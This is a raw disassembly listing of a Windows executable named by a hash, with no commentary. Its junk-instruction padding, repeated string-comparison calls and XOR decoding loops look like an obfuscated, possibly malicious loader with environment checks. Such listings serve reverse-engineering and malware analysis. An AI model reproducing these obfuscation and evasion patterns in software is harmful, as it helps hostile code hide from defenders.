
73f6bac5f5b0ebb6df5390ad5e23bf79a5d051fbcaf0bdbdbb4a6e434053f190.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xe4
  401009:	push   edi
  40100a:	or     DWORD PTR ds:0x42b018,0x42d018
  401014:	push   0x42e3c7
  401019:	xor    edi,edi
  40101b:	add    DWORD PTR ds:0x42d000,0x42d008
  401025:	inc    edi
  401026:	adc    DWORD PTR ds:0x42901c,0x42c00c
  401030:	push   edi
  401031:	dec    DWORD PTR ds:0x42a018
  401037:	push   edi
  401038:	not    DWORD PTR ds:0x42901c
  40103e:	call   DWORD PTR ds:0x42e90f
  401044:	test   eax,eax
  401046:	je     0x40106f
  40104c:	lea    eax,[ebp-0x50]
  40104f:	push   eax
  401050:	adc    DWORD PTR ds:0x42c018,0x408c
  40105a:	call   DWORD PTR ds:0x42e927
  401060:	mov    DWORD PTR ds:0x42c010,0x701a
  40106a:	jmp    0x4025df
  40106f:	or     DWORD PTR ds:0x42a010,0x42901c
  401079:	push   esi
  40107a:	or     DWORD PTR ds:0x42c018,0x254e
  401084:	mov    esi,DWORD PTR ds:0x42e90b
  40108a:	sub    DWORD PTR ds:0x42c000,0x42b014
  401094:	push   0x8
  401096:	add    DWORD PTR ds:0x42c004,0x1529
  4010a0:	push   0x42e3d7
  4010a5:	sub    DWORD PTR ds:0x42b00c,0x42c010
  4010af:	call   esi
  4010b1:	test   eax,eax
  4010b3:	je     0x4010f0
  4010b9:	sub    DWORD PTR ds:0x429004,0x42c000
  4010c3:	lea    eax,[ebp-0x50]
  4010c6:	sub    DWORD PTR ds:0x429000,0x1be5
  4010d0:	push   eax
  4010d1:	sbb    DWORD PTR ds:0x42b000,0x42d010
  4010db:	call   DWORD PTR ds:0x42e927
  4010e1:	mov    DWORD PTR ds:0x42b000,0x51df
  4010eb:	jmp    0x4025de
  4010f0:	push   ebx
  4010f1:	mov    ebx,DWORD PTR ds:0x429028
  4010f7:	or     ebx,DWORD PTR ds:0x429008
  4010fd:	mov    DWORD PTR ds:0x429028,ebx
  401103:	mov    ebx,DWORD PTR ds:0x42e907
  401109:	add    DWORD PTR ds:0x429024,0x4675
  401113:	push   0x42e3e7
  401118:	or     DWORD PTR ds:0x42c008,0x42c018
  401122:	push   edi
  401123:	adc    DWORD PTR ds:0x42c014,0x42b014
  40112d:	push   edi
  40112e:	call   ebx
  401130:	and    DWORD PTR ds:0x429020,0x61d3
  40113a:	test   eax,eax
  40113c:	jne    0x40121c
  401142:	sbb    DWORD PTR ds:0x42c004,0x42b004
  40114c:	push   0xc
  40114e:	mov    DWORD PTR ds:0x42d004,0x2d3b
  401158:	push   0x42e40b
  40115d:	call   esi
  40115f:	inc    DWORD PTR ds:0x42c008
  401165:	test   eax,eax
  401167:	mov    DWORD PTR ds:0x42b010,0x1593
  401171:	jne    0x40121c
  401177:	sub    DWORD PTR ds:0x42d000,0x17f0
  401181:	push   0x7
  401183:	add    DWORD PTR ds:0x429024,0x2885
  40118d:	push   0x42e41f
  401192:	call   esi
  401194:	and    DWORD PTR ds:0x42d014,0x42c000
  40119e:	test   eax,eax
  4011a0:	mov    DWORD PTR ds:0x42c014,0x720
  4011aa:	jne    0x40121c
  4011b0:	or     DWORD PTR ds:0x42b004,0x42b01c
  4011ba:	push   0x8
  4011bc:	push   0x42e42f
  4011c1:	sbb    DWORD PTR ds:0x42d014,0x5687
  4011cb:	call   esi
  4011cd:	xor    DWORD PTR ds:0x429014,0x42b018
  4011d7:	test   eax,eax
  4011d9:	mov    DWORD PTR ds:0x42d008,0x6461
  4011e3:	jne    0x40121c
  4011e9:	mov    DWORD PTR ds:0x42a014,0x128
  4011f3:	push   0x42e43f
  4011f8:	push   edi
  4011f9:	push   edi
  4011fa:	adc    DWORD PTR ds:0x429020,0x42a000
  401204:	call   DWORD PTR ds:0x42e90f
  40120a:	test   eax,eax
  40120c:	mov    DWORD PTR ds:0x42a01c,0x679f
  401216:	je     0x401249
  40121c:	lea    eax,[ebp-0x50]
  40121f:	sub    DWORD PTR ds:0x42c004,0x42a000
  401229:	push   eax
  40122a:	adc    DWORD PTR ds:0x429024,0xd32
  401234:	call   DWORD PTR ds:0x42e927
  40123a:	mov    DWORD PTR ds:0x42d008,0x45e0
  401244:	jmp    0x4025dd
  401249:	sub    DWORD PTR ds:0x429004,0x429014
  401253:	push   0x42e44f
  401258:	push   edi
  401259:	and    DWORD PTR ds:0x42b00c,0x7ff1
  401263:	push   edi
  401264:	or     DWORD PTR ds:0x42d014,0x42c01c
  40126e:	call   ebx
  401270:	test   eax,eax
  401272:	mov    DWORD PTR ds:0x429028,0x42c
  40127c:	je     0x401766
  401282:	xor    DWORD PTR ds:0x42b01c,0x42a010
  40128c:	push   0xc
  40128e:	xor    DWORD PTR ds:0x42d00c,0x685
  401298:	push   0x42e473
  40129d:	and    DWORD PTR ds:0x42a01c,0x363a
  4012a7:	call   esi
  4012a9:	test   eax,eax
  4012ab:	mov    DWORD PTR ds:0x42b014,0x15a6
  4012b5:	jne    0x40175f
  4012bb:	mov    DWORD PTR ds:0x42b01c,0x5b0e
  4012c5:	push   0x7
  4012c7:	push   0x42e487
  4012cc:	call   esi
  4012ce:	test   eax,eax
  4012d0:	jne    0x40175f
  4012d6:	push   0x8
  4012d8:	push   0x42e497
  4012dd:	call   esi
  4012df:	or     DWORD PTR ds:0x42c018,0x5fc7
  4012e9:	test   eax,eax
  4012eb:	mov    DWORD PTR ds:0x42b01c,0x6bd8
  4012f5:	jne    0x40175f
  4012fb:	add    DWORD PTR ds:0x429000,0x429014
  401305:	push   0x42e4a7
  40130a:	push   edi
  40130b:	push   edi
  40130c:	xor    DWORD PTR ds:0x42d014,0x5ea1
  401316:	call   DWORD PTR ds:0x42e90f
  40131c:	sub    DWORD PTR ds:0x42901c,0x42c008
  401326:	test   eax,eax
  401328:	mov    DWORD PTR ds:0x42a004,0x3a7d
  401332:	jne    0x40175f
  401338:	push   0x42e4b7
  40133d:	and    DWORD PTR ds:0x42a004,0x429004
  401347:	push   edi
  401348:	or     DWORD PTR ds:0x42a01c,0x6055
  401352:	push   edi
  401353:	sub    DWORD PTR ds:0x429014,0x42b00c
  40135d:	call   ebx
  40135f:	xor    DWORD PTR ds:0x42b008,0x42a018
  401369:	test   eax,eax
  40136b:	mov    DWORD PTR ds:0x429014,0x3a80
  401375:	jne    0x40175f
  40137b:	or     DWORD PTR ds:0x42b00c,0x42b010
  401385:	push   0xc
  401387:	push   0x42e4db
  40138c:	call   esi
  40138e:	test   eax,eax
  401390:	jne    0x40175f
  401396:	mov    DWORD PTR ds:0x42900c,0x5e8c
  4013a0:	push   0x7
  4013a2:	push   0x42e4ef
  4013a7:	and    DWORD PTR ds:0x42b010,0x4122
  4013b1:	call   esi
  4013b3:	test   eax,eax
  4013b5:	mov    DWORD PTR ds:0x42a018,0x79ff
  4013bf:	jne    0x40175f
  4013c5:	push   0x8
  4013c7:	push   0x42e4ff
  4013cc:	call   esi
  4013ce:	test   eax,eax
  4013d0:	jne    0x40175f
  4013d6:	or     DWORD PTR ds:0x42a00c,0x42b01c
  4013e0:	push   0x42e50f
  4013e5:	sbb    DWORD PTR ds:0x42d004,0x5fa0
  4013ef:	push   edi
  4013f0:	and    DWORD PTR ds:0x42900c,0x42d00c
  4013fa:	push   edi
  4013fb:	add    DWORD PTR ds:0x42c010,0x54c5
  401405:	call   DWORD PTR ds:0x42e90f
  40140b:	mov    DWORD PTR ds:0x42b010,0x4d18
  401415:	test   eax,eax
  401417:	mov    DWORD PTR ds:0x42b018,0x69c2
  401421:	jne    0x40175f
  401427:	or     DWORD PTR ds:0x42c004,0x44f8
  401431:	push   0x42e51f
  401436:	add    DWORD PTR ds:0x42c004,0x42b01c
  401440:	push   edi
  401441:	adc    DWORD PTR ds:0x429004,0x4c2b
  40144b:	push   edi
  40144c:	call   ebx
  40144e:	test   eax,eax
  401450:	mov    DWORD PTR ds:0x42a008,0x516b
  40145a:	jne    0x40175f
  401460:	add    DWORD PTR ds:0x42d014,0x429018
  40146a:	push   0xc
  40146c:	push   0x42e543
  401471:	mov    DWORD PTR ds:0x42a004,0x58e8
  40147b:	call   esi
  40147d:	sbb    DWORD PTR ds:0x429028,0x2f15
  401487:	test   eax,eax
  401489:	jne    0x40175f
  40148f:	adc    DWORD PTR ds:0x42b000,0x4b6d
  401499:	push   0x7
  40149b:	sbb    DWORD PTR ds:0x42c014,0x42d004
  4014a5:	push   0x42e557
  4014aa:	or     DWORD PTR ds:0x42d008,0x1d0d
  4014b4:	call   esi
  4014b6:	xor    DWORD PTR ds:0x42c018,0xe1e
  4014c0:	test   eax,eax
  4014c2:	mov    DWORD PTR ds:0x42c010,0x6fc5
  4014cc:	jne    0x40175f
  4014d2:	push   0x8
  4014d4:	push   0x42e567
  4014d9:	add    DWORD PTR ds:0x42d000,0x42d018
  4014e3:	call   esi
  4014e5:	test   eax,eax
  4014e7:	jne    0x40175f
  4014ed:	push   0x42e577
  4014f2:	push   edi
  4014f3:	or     DWORD PTR ds:0x42d01c,0x429028
  4014fd:	push   edi
  4014fe:	call   DWORD PTR ds:0x42e90f
  401504:	test   eax,eax
  401506:	mov    DWORD PTR ds:0x42b018,0xe81
  401510:	jne    0x40175f
  401516:	or     DWORD PTR ds:0x42c00c,0x42b014
  401520:	push   0x42e587
  401525:	sub    DWORD PTR ds:0x42c004,0x429028
  40152f:	push   edi
  401530:	xor    DWORD PTR ds:0x42d010,0x42901c
  40153a:	push   edi
  40153b:	and    DWORD PTR ds:0x42d014,0x50c
  401545:	call   ebx
  401547:	test   eax,eax
  401549:	mov    DWORD PTR ds:0x42c008,0x6727
  401553:	jne    0x40175f
  401559:	push   0xc
  40155b:	adc    DWORD PTR ds:0x42a00c,0x1435
  401565:	push   0x42e5ab
  40156a:	mov    DWORD PTR ds:0x42c00c,0x3eef
  401574:	call   esi
  401576:	xor    DWORD PTR ds:0x42b014,0x10aa
  401580:	test   eax,eax
  401582:	mov    DWORD PTR ds:0x42a014,0x7a40
  40158c:	jne    0x40175f
  401592:	push   0x7
  401594:	adc    DWORD PTR ds:0x42b008,0x42a010
  40159e:	push   0x42e5bf
  4015a3:	or     DWORD PTR ds:0x42d004,0x42c014
  4015ad:	call   esi
  4015af:	add    DWORD PTR ds:0x42b008,0x42b014
  4015b9:	test   eax,eax
  4015bb:	mov    DWORD PTR ds:0x42c000,0x2197
  4015c5:	jne    0x40175f
  4015cb:	sub    DWORD PTR ds:0x42a004,0x42b008
  4015d5:	push   0x8
  4015d7:	sbb    DWORD PTR ds:0x42a000,0x42d01c
  4015e1:	push   0x42e5cf
  4015e6:	adc    DWORD PTR ds:0x42b00c,0x429010
  4015f0:	call   esi
  4015f2:	mov    DWORD PTR ds:0x42c004,0x76c3
  4015fc:	test   eax,eax
  4015fe:	mov    DWORD PTR ds:0x42901c,0x7b99
  401608:	jne    0x40175f
  40160e:	adc    DWORD PTR ds:0x42c008,0x42901c
  401618:	push   0x42e5df
  40161d:	push   edi
  40161e:	push   edi
  40161f:	call   DWORD PTR ds:0x42e90f
  401625:	adc    DWORD PTR ds:0x42a004,0x43e7
  40162f:	test   eax,eax
  401631:	jne    0x40175f
  401637:	sbb    DWORD PTR ds:0x42b00c,0x42c008
  401641:	push   0x42e5ef
  401646:	or     DWORD PTR ds:0x42d00c,0x67f5
  401650:	push   edi
  401651:	mov    DWORD PTR ds:0x42c008,0x11d2
  40165b:	push   edi
  40165c:	add    DWORD PTR ds:0x429024,0x35c0
  401666:	call   ebx
  401668:	adc    DWORD PTR ds:0x42a01c,0x475f
  401672:	test   eax,eax
  401674:	mov    DWORD PTR ds:0x42c010,0x9db
  40167e:	jne    0x40175f
  401684:	add    DWORD PTR ds:0x42b01c,0x42c010
  40168e:	push   0xc
  401690:	push   0x42e613
  401695:	call   esi
  401697:	test   eax,eax
  401699:	jne    0x40175f
  40169f:	push   0x7
  4016a1:	sub    DWORD PTR ds:0x42a010,0x42b00c
  4016ab:	push   0x42e627
  4016b0:	xor    DWORD PTR ds:0x42a000,0x46f8
  4016ba:	call   esi
  4016bc:	sub    DWORD PTR ds:0x429028,0x1e37
  4016c6:	test   eax,eax
  4016c8:	mov    DWORD PTR ds:0x429008,0x34bb
  4016d2:	jne    0x40175f
  4016d8:	adc    DWORD PTR ds:0x42d01c,0x42d008
  4016e2:	push   0x8
  4016e4:	neg    DWORD PTR ds:0x42d004
  4016ea:	push   0x42e637
  4016ef:	call   esi
  4016f1:	xor    DWORD PTR ds:0x429020,0x5303
  4016fb:	test   eax,eax
  4016fd:	jne    0x40175f
  401703:	sub    DWORD PTR ds:0x429014,0x42c01c
  40170d:	push   0x42e647
  401712:	not    DWORD PTR ds:0x429000
  401718:	push   edi
  401719:	or     DWORD PTR ds:0x42c01c,0x7461
  401723:	push   edi
  401724:	call   DWORD PTR ds:0x42e90f
  40172a:	test   eax,eax
  40172c:	mov    DWORD PTR ds:0x42901c,0x5bee
  401736:	jne    0x40175f
  40173c:	sbb    DWORD PTR ds:0x42c008,0x1a2b
  401746:	push   0x42e657
  40174b:	push   edi
  40174c:	neg    DWORD PTR ds:0x42b010
  401752:	push   edi
  401753:	sbb    DWORD PTR ds:0x42c000,0x42b008
  40175d:	call   ebx
  40175f:	xor    eax,eax
  401761:	jmp    0x4025dd
  401766:	mov    esi,DWORD PTR ds:0x41cde0
  40176c:	mov    eax,ds:0x41ce2c
  401771:	sub    eax,esi
  401773:	xor    esi,DWORD PTR [esi+eax*1]
  401776:	mov    DWORD PTR [ebp-0x10],0x0
  40177d:	mov    eax,DWORD PTR [ebp-0x34]
  401780:	mov    DWORD PTR [ebp-0x34],eax
  401783:	mov    ecx,0xf89c8585
  401788:	neg    edi
  40178a:	mov    DWORD PTR [ebp-0x8],ecx
  40178d:	mov    edx,DWORD PTR ds:0x42d018
  401793:	sub    edx,DWORD PTR ds:0x42b000
  401799:	mov    DWORD PTR ds:0x42d018,edx
  40179f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4017a6:	xor    esi,esi
  4017a8:	add    esi,DWORD PTR ds:0x41cd71
  4017ae:	xor    edx,edx
  4017b0:	add    edx,DWORD PTR ds:0x41cdf8
  4017b6:	sub    esi,edx
  4017b8:	and    esi,DWORD PTR [esi+edx*1]
  4017bb:	lea    eax,[ebp-0x3c]
  4017be:	and    DWORD PTR ds:0x42c000,0x550f
  4017c8:	mov    DWORD PTR [ebp-0x30],eax
  4017cb:	mov    DWORD PTR ds:0x42a010,0x1f
  4017d5:	cmp    DWORD PTR ds:0x42a010,0x0
  4017dc:	je     0x40182a
  4017e2:	cmp    DWORD PTR ds:0x42a010,0x2a
  4017e9:	jne    0x401805
  4017ef:	push   DWORD PTR [ebp-0x10]
  4017f2:	push   0x7c9b
  4017f7:	push   0x511d
  4017fc:	push   DWORD PTR [ebp-0x1c]
  4017ff:	call   DWORD PTR ds:0x42e8e7
  401805:	mov    edx,DWORD PTR ds:0x42a010
  40180b:	dec    edx
  40180c:	mov    DWORD PTR ds:0x42a010,edx
  401812:	jmp    0x4017d5
  401817:	mov    edx,DWORD PTR ds:0x41cdd8
  40181d:	xor    edi,edi
  40181f:	xor    edi,DWORD PTR ds:0x41ce10
  401825:	sub    edi,edx
  401827:	add    edx,DWORD PTR [edx+edi*1]
  40182a:	lea    eax,[ebp-0x44]
  40182d:	mov    DWORD PTR [ebp-0x18],eax
  401830:	mov    edi,DWORD PTR ds:0x41ce2c
  401836:	mov    edx,DWORD PTR ds:0x41cd89
  40183c:	sub    edx,edi
  40183e:	imul   edi,DWORD PTR [edi+edx*1]
  401842:	mov    eax,ds:0x42e2b7
  401847:	movzx  edx,BYTE PTR ds:0x42a01c
  40184e:	and    edx,DWORD PTR ds:0x42c010
  401854:	mov    DWORD PTR ds:0x42a01c,edx
  40185a:	mov    eax,DWORD PTR [eax+0x1c8]
  401860:	mov    eax,DWORD PTR [eax]
  401862:	xor    edi,edi
  401864:	mov    edx,DWORD PTR [ebp-0x18]
  401867:	mov    esi,DWORD PTR ds:0x429028
  40186d:	and    DWORD PTR ds:0x42d004,esi
  401873:	mov    esi,0x751089b
  401878:	or     DWORD PTR ds:0x42900c,ebx
  40187e:	xor    eax,esi
  401880:	and    DWORD PTR ds:0x42b010,0x0
  40188a:	mov    edi,DWORD PTR ds:0x42b010
  401890:	inc    edi
  401891:	mov    DWORD PTR ds:0x42b010,edi
  401897:	cmp    DWORD PTR ds:0x42b010,0x25
  40189e:	jne    0x4018ba
  4018a4:	push   DWORD PTR [ebp-0x1c]
  4018a7:	push   DWORD PTR [ebp-0x10]
  4018aa:	push   0x42e000
  4018af:	push   0x400000
  4018b4:	call   DWORD PTR ds:0x42e8eb
  4018ba:	cmp    DWORD PTR ds:0x42b010,0x17
  4018c1:	jb     0x40188a
  4018c7:	mov    edi,0x3272e2
  4018cc:	add    eax,edi
  4018ce:	mov    DWORD PTR ds:0x42a010,0x30bc
  4018d8:	mov    DWORD PTR [edx],eax
  4018da:	mov    DWORD PTR ds:0x42c014,0x6382
  4018e4:	mov    eax,ds:0x42e753
  4018e9:	mov    DWORD PTR ds:0x429028,0x5397
  4018f3:	cmp    eax,0x312bc9f6
  4018f8:	jne    0x401986
  4018fe:	mov    eax,DWORD PTR [ebp-0x8]
  401901:	sub    DWORD PTR ds:0x42c004,edx
  401907:	mov    edx,DWORD PTR ds:0x42e2b7
  40190d:	mov    ebx,DWORD PTR ds:0x41ce24
  401913:	mov    ebx,DWORD PTR [ebx]
  401915:	adc    DWORD PTR ds:0x42a018,ebx
  40191b:	mov    edx,DWORD PTR [edx+0x198]
  401921:	xor    ebx,0x3fd0
  401927:	xor    eax,esi
  401929:	sbb    DWORD PTR ds:0x429010,0x42901c
  401933:	add    eax,edi
  401935:	or     DWORD PTR ds:0x42900c,edx
  40193b:	mov    DWORD PTR [edx],eax
  40193d:	mov    eax,DWORD PTR [ebp-0x8]
  401940:	and    DWORD PTR ds:0x42a014,0x0
  40194a:	mov    ebx,DWORD PTR ds:0x42a014
  401950:	inc    ebx
  401951:	mov    DWORD PTR ds:0x42a014,ebx
  401957:	cmp    DWORD PTR ds:0x42a014,0x20
  40195e:	jne    0x40196a
  401964:	call   DWORD PTR ds:0x42e8ef
  40196a:	cmp    DWORD PTR ds:0x42a014,0x1c
  401971:	jb     0x40194a
  401977:	xor    eax,esi
  401979:	add    eax,edi
  40197b:	add    DWORD PTR ds:0x42d00c,ebx
  401981:	mov    ds:0x42e753,eax
  401986:	mov    eax,ds:0x42e2b7
  40198b:	and    DWORD PTR ds:0x42c014,0x7897
  401995:	mov    eax,DWORD PTR [eax+0x18c]
  40199b:	or     DWORD PTR ds:0x42d004,0x42d014
  4019a5:	mov    eax,DWORD PTR [eax]
  4019a7:	sbb    ebx,0x2d4c
  4019ad:	mov    DWORD PTR [ebp-0x7c],eax
  4019b0:	sbb    DWORD PTR ds:0x42c008,edx
  4019b6:	mov    ebx,0xf89c85b9
  4019bb:	neg    eax
  4019bd:	mov    DWORD PTR [ebp-0x10],ebx
  4019c0:	and    DWORD PTR ds:0x42c000,0x0
  4019ca:	mov    eax,ds:0x42c000
  4019cf:	inc    eax
  4019d0:	mov    ds:0x42c000,eax
  4019d5:	cmp    DWORD PTR ds:0x42c000,0xa
  4019dc:	jne    0x4019e8
  4019e2:	call   DWORD PTR ds:0x42e8f3
  4019e8:	cmp    DWORD PTR ds:0x42c000,0x9
  4019ef:	jne    0x401a00
  4019f5:	mov    eax,ds:0x42c000
  4019fa:	inc    eax
  4019fb:	mov    ds:0x42c000,eax
  401a00:	cmp    DWORD PTR ds:0x42c000,0x15
  401a07:	jb     0x4019ca
  401a0d:	movzx  eax,WORD PTR ds:0x42c00c
  401a14:	and    eax,DWORD PTR ds:0x42c018
  401a1a:	mov    ds:0x42c00c,eax
  401a1f:	mov    DWORD PTR [ebp-0x10],ebx
  401a22:	sub    DWORD PTR ds:0x42b004,ecx
  401a28:	mov    DWORD PTR [ebp-0x10],ebx
  401a2b:	mov    DWORD PTR [ebp-0x18],ecx
  401a2e:	mov    DWORD PTR [ebp-0x10],ebx
  401a31:	dec    DWORD PTR ds:0x42c014
  401a37:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401a3e:	mov    eax,ds:0x42a010
  401a43:	adc    DWORD PTR ds:0x42b00c,eax
  401a49:	mov    eax,DWORD PTR [ebp-0x8]
  401a4c:	add    DWORD PTR ds:0x42a004,0x42901c
  401a56:	xor    eax,esi
  401a58:	add    eax,edi
  401a5a:	mov    DWORD PTR ds:0x42d00c,0x4361
  401a64:	jmp    0x401b08
  401a69:	and    eax,ecx
  401a6b:	mov    eax,DWORD PTR [ebp-0xc]
  401a6e:	mov    ecx,DWORD PTR [ebp-0x1c]
  401a71:	sbb    DWORD PTR ds:0x42d01c,0x38e1
  401a7b:	xor    eax,esi
  401a7d:	or     DWORD PTR ds:0x42b008,0x32de
  401a87:	lea    eax,[eax+ecx*1+0x3272e2]
  401a8e:	or     DWORD PTR ds:0x42900c,0x42c014
  401a98:	push   eax
  401a99:	mov    eax,DWORD PTR [ebp-0x18]
  401a9c:	mov    DWORD PTR ds:0x42b000,0x3f7a
  401aa6:	xor    eax,esi
  401aa8:	adc    DWORD PTR ds:0x42a000,0x429018
  401ab2:	lea    eax,[ebp+eax*1+0x3272ea]
  401ab9:	or     DWORD PTR ds:0x429000,0x42d01c
  401ac3:	push   eax
  401ac4:	sbb    eax,DWORD PTR ds:0x429000
  401aca:	mov    eax,ds:0x42e2b7
  401acf:	push   DWORD PTR [eax+0x1bc]
  401ad5:	and    DWORD PTR ds:0x42d014,0x65ae
  401adf:	call   0x4025f2
  401ae4:	mov    eax,DWORD PTR [ebp-0xc]
  401ae7:	or     edx,0x44
  401aed:	mov    ecx,DWORD PTR [ebp-0x1c]
  401af0:	neg    edx
  401af2:	xor    eax,esi
  401af4:	movzx  edx,BYTE PTR ds:0x42d000
  401afb:	add    DWORD PTR ds:0x429008,edx
  401b01:	lea    eax,[ecx+eax*1+0x3272e2]
  401b08:	mov    ecx,DWORD PTR [ebp-0xc]
  401b0b:	sbb    DWORD PTR ds:0x42900c,0x42c010
  401b15:	mov    edx,DWORD PTR [ebp-0xc]
  401b18:	sbb    DWORD PTR ds:0x42c00c,0x3f25
  401b22:	xor    edx,esi
  401b24:	xor    DWORD PTR ds:0x42901c,0x360b
  401b2e:	xor    ecx,esi
  401b30:	add    ecx,edx
  401b32:	mov    edx,DWORD PTR [ebp-0xc]
  401b35:	xor    edx,esi
  401b37:	lea    ecx,[ecx+edx*1+0x9758a6]
  401b3e:	mov    DWORD PTR ds:0x429010,0x1f54
  401b48:	mov    DWORD PTR [ebp-0x1c],eax
  401b4b:	cmp    eax,ecx
  401b4d:	jbe    0x401a69
  401b53:	mov    eax,ds:0x429020
  401b58:	adc    DWORD PTR ds:0x42901c,eax
  401b5e:	mov    eax,DWORD PTR [ebp+0xc]
  401b61:	mov    ecx,DWORD PTR ds:0x41cd6d
  401b67:	mov    ecx,DWORD PTR [ecx]
  401b69:	or     DWORD PTR ds:0x429028,ecx
  401b6f:	mov    ds:0x42e13b,eax
  401b74:	mov    ecx,DWORD PTR ds:0x429000
  401b7a:	or     DWORD PTR ds:0x42c008,ecx
  401b80:	mov    eax,DWORD PTR [ebp+0x10]
  401b83:	and    DWORD PTR ds:0x42b01c,0x0
  401b8d:	jmp    0x401b9f
  401b92:	mov    ecx,DWORD PTR ds:0x42b01c
  401b98:	inc    ecx
  401b99:	mov    DWORD PTR ds:0x42b01c,ecx
  401b9f:	cmp    DWORD PTR ds:0x42b01c,0x11
  401ba6:	jae    0x401bd3
  401bac:	cmp    DWORD PTR ds:0x42b01c,0x16
  401bb3:	jne    0x401bc4
  401bb9:	push   0x42e0f6
  401bbe:	call   DWORD PTR ds:0x42e8f7
  401bc4:	jmp    0x401b92
  401bc9:	mov    DWORD PTR ds:0x42a018,0x900
  401bd3:	mov    ds:0x42e38f,eax
  401bd8:	adc    DWORD PTR ds:0x42d008,0x597
  401be2:	mov    eax,ds:0x42e13b
  401be7:	mov    DWORD PTR ds:0x42901c,0x19
  401bf1:	cmp    DWORD PTR ds:0x42901c,0x0
  401bf8:	je     0x401c2a
  401bfe:	cmp    DWORD PTR ds:0x42901c,0x23
  401c05:	jne    0x401c16
  401c0b:	push   0x42e075
  401c10:	call   DWORD PTR ds:0x42e8fb
  401c16:	mov    ecx,DWORD PTR ds:0x42901c
  401c1c:	dec    ecx
  401c1d:	mov    DWORD PTR ds:0x42901c,ecx
  401c23:	jmp    0x401bf1
  401c28:	neg    ecx
  401c2a:	mov    ecx,DWORD PTR [ebp-0x30]
  401c2d:	sub    eax,edi
  401c2f:	xor    eax,esi
  401c31:	mov    DWORD PTR [ecx],eax
  401c33:	mov    eax,DWORD PTR [ebp-0x34]
  401c36:	mov    DWORD PTR ds:0x42c014,0x2861
  401c40:	cmp    eax,0xf89c8585
  401c45:	jne    0x401f18
  401c4b:	lea    eax,[ebp-0x48]
  401c4e:	mov    DWORD PTR [ebp-0x9c],eax
  401c54:	lea    eax,[ebp+0x4]
  401c57:	or     DWORD PTR ds:0x42d000,0x2377
  401c61:	mov    DWORD PTR [ebp-0x48],eax
  401c64:	xor    DWORD PTR ds:0x42a018,ecx
  401c6a:	mov    eax,DWORD PTR [ebp-0x48]
  401c6d:	test   eax,eax
  401c6f:	mov    DWORD PTR ds:0x42c00c,0x1657
  401c79:	je     0x4025c2
  401c7f:	mov    eax,DWORD PTR [ebp-0x24]
  401c82:	mov    eax,DWORD PTR [ebp-0xc]
  401c85:	sbb    eax,ecx
  401c87:	mov    eax,DWORD PTR [ebp-0x8]
  401c8a:	or     ecx,DWORD PTR ds:0x42c018
  401c90:	mov    DWORD PTR [ebp+0xc],eax
  401c93:	xor    DWORD PTR ds:0x42a014,edi
  401c99:	mov    eax,eax
  401c9b:	sub    DWORD PTR ds:0x42c000,0x352b
  401ca5:	mov    eax,ds:0x42e2b7
  401caa:	mov    DWORD PTR ds:0x42b014,0x12
  401cb4:	cmp    DWORD PTR ds:0x42b014,0x0
  401cbb:	je     0x401d04
  401cc1:	cmp    DWORD PTR ds:0x42b014,0x7
  401cc8:	jne    0x401cd4
  401cce:	call   DWORD PTR ds:0x42e8ff
  401cd4:	cmp    DWORD PTR ds:0x42b014,0x8
  401cdb:	jne    0x401cf0
  401ce1:	xor    ecx,ecx
  401ce3:	add    ecx,DWORD PTR ds:0x42b014
  401ce9:	dec    ecx
  401cea:	mov    DWORD PTR ds:0x42b014,ecx
  401cf0:	xor    ecx,ecx
  401cf2:	xor    ecx,DWORD PTR ds:0x42b014
  401cf8:	dec    ecx
  401cf9:	mov    DWORD PTR ds:0x42b014,ecx
  401cff:	jmp    0x401cb4
  401d04:	mov    eax,DWORD PTR [eax+0x1c8]
  401d0a:	mov    eax,DWORD PTR [eax]
  401d0c:	mov    DWORD PTR ds:0x429004,0x1d
  401d16:	cmp    DWORD PTR ds:0x429004,0x0
  401d1d:	je     0x401d6d
  401d23:	cmp    DWORD PTR ds:0x429004,0x4
  401d2a:	jne    0x401d41
  401d30:	push   DWORD PTR [ebp-0x28]
  401d33:	push   0x42d000
  401d38:	push   DWORD PTR [ebp-0xc]
  401d3b:	call   DWORD PTR ds:0x42e903
  401d41:	cmp    DWORD PTR ds:0x429004,0x5
  401d48:	jne    0x401d5b
  401d4e:	mov    ecx,DWORD PTR ds:0x429004
  401d54:	dec    ecx
  401d55:	mov    DWORD PTR ds:0x429004,ecx
  401d5b:	mov    ecx,DWORD PTR ds:0x429004
  401d61:	dec    ecx
  401d62:	mov    DWORD PTR ds:0x429004,ecx
  401d68:	jmp    0x401d16
  401d6d:	cdq    
  401d6e:	inc    ecx
  401d6f:	mov    ebx,eax
  401d71:	mov    ecx,DWORD PTR ds:0x42b008
  401d77:	adc    ecx,DWORD PTR ds:0x42b000
  401d7d:	mov    DWORD PTR ds:0x42b008,ecx
  401d83:	mov    eax,0xfabdbee7
  401d88:	and    DWORD PTR ds:0x429014,edi
  401d8e:	add    ebx,eax
  401d90:	mov    DWORD PTR ds:0x42c004,0x916
  401d9a:	adc    edx,0xffffffff
  401d9d:	and    DWORD PTR [ebp-0x10],0x0
  401da1:	or     DWORD PTR ds:0x42b018,0x42d014
  401dab:	xor    edx,0x0
  401dae:	mov    DWORD PTR [ebp-0x6c],edx
  401db1:	adc    DWORD PTR ds:0x42d008,ebx
  401db7:	mov    edx,DWORD PTR [ebp+0xc]
  401dba:	sbb    DWORD PTR ds:0x429004,edi
  401dc0:	mov    DWORD PTR [ebp-0x14],edx
  401dc3:	mov    ecx,0x8a29a12d
  401dc8:	add    edx,0x36ec
  401dce:	xor    ebx,ecx
  401dd0:	add    DWORD PTR [ebp-0x14],eax
  401dd3:	mov    DWORD PTR ds:0x42901c,ebx
  401dd9:	mov    edx,DWORD PTR [ebp-0x14]
  401ddc:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401de0:	xor    edx,ecx
  401de2:	mov    DWORD PTR [ebp-0x5c],edx
  401de5:	or     DWORD PTR ds:0x42a00c,edi
  401deb:	mov    edx,DWORD PTR [ebp-0x10]
  401dee:	xor    DWORD PTR ds:0x42d00c,0x42c018
  401df8:	xor    edx,0x0
  401dfb:	mov    DWORD PTR [ebp-0x58],edx
  401dfe:	mov    DWORD PTR ds:0x42900c,0x40f4
  401e08:	cmp    DWORD PTR [ebp-0x5c],ebx
  401e0b:	mov    DWORD PTR ds:0x42a004,0x5ee8
  401e15:	jne    0x401e3b
  401e1b:	mov    DWORD PTR ds:0x42b004,0x3032
  401e25:	mov    edx,DWORD PTR [ebp-0x6c]
